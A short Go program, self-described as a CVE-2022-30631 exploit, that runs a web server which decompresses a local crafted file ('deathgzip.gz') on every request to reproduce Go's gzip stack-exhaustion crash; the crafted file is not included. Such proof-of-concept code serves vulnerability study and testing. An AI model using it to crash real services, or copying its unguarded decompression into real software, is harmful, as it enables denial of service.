package main

// CVE-2022-30631 web server and file exploit

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func handlerFunc(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, "<h1> Welcome! </h1>")

	f, _ := os.Open("./deathgzip.gz")

	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)

	read := bytes.NewReader(content)

	z, err := gzip.NewReader(read)
	if err != nil {
		fmt.Println("NewReader error: ", err)
		log.Fatalf("NewReader: got %v, want nil", err)
	}

	_, err = z.Read(make([]byte, 10))
	if err != io.EOF {
		fmt.Println("Read error: ", err)
		err := fmt.Errorf("Reader.Read: got %v, want %v", err, io.EOF)
		fmt.Println(err.Error())
	}
	fmt.Fprint(w, "<h1> OK! </h1>")
}

func main() {
	http.HandleFunc("/", handlerFunc)
	fmt.Println("Starting the server on :3000..")
	err := http.ListenAndServe(":3000", nil)
	if err != nil {
		panic(err)
	}
}
